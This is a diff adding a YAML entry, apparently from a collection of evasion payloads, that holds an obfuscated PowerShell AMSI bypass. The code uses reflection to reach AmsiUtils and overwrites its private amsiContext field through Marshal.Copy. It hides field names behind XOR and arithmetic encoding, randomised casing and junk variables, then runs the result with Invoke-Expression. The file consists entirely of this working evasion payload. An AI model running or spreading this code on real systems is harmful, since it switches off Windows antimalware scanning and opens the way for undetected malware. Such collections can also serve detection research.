@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "amsi-bypass-windows-fieldoffset-2.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-27"
+  authors: ["@s3mme", "@TIVKU", "https://amsi.fail/"]
+
+content: |
+  $D3d0HCNpAG2r4="`$ZwNsvR=[AppdOmAIN]::CuRrEntDomAin.GETaSsemBLieS()|WHEre-ObjecT{`$_.locAtION -AND `$_.lOcAtioN.EnDswiTh('System.Management.Automation.dll')};`$NwVzpugXs8=[systeM.refLEctIOn.BindiNGFLAGs]'NonPublic,Static';[void](geT-VARIaBLe -NaMe 'k0niYQ8' -ErRORActION SiLenTlyCOnTinue);`$OIOYL6=`$zwNSvR.gettypEs()|wHERe-oBJECT{`$_.NAMe -EQ `$(('slitUismA'[(0xceda -bxoR 0XCED2)..0] -jOIN ''))};[sYSTEM.ThrEaDing.THreAd]::slEEP(148);`$T7jHkthSf7u=`$OiOYl6.GEtfiEld(`$(([sYsTem.TEXt.EnCODINg]::Ascii.gEtsTriNG([Byte[]]((97*22/22),(109*46/46),((2+113)),(105+15-15),(67+38-38),(97+14),((110+67-67)),(0XB882 -BXOR 0xB8f6),(25+76),(112+8),(13+103))))),`$nWVzPUgxS8).GETVaLUe(`$NUll);`$uKGP='DdQFhPnSg56k2a';`$B13YmZg=[sYStEm.biTCONVeRteR]::GeTBYtES([syStem.InT32]::maXVAlUE);`$Junc='MnRNWimuWMq';[sySTem.RuNtime.InteropservIcES.mArSHAl]::COPy(`$B13YMzG,0,`$T7jHktHSF7u,4)";Invoke-ExprEsSion $D3d0HCNpAG2r4
